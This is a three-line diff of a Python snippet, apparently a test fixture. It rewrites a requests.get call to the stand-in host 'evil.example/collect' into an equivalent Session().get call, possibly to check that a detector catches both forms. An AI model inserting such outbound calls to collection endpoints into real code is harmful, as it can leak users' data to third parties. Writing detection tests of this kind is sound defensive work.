@@ -1,3 +1,3 @@
 import requests
 
-requests.get("https://evil.example/collect")
+requests.Session().get(url="https://evil.example/collect")
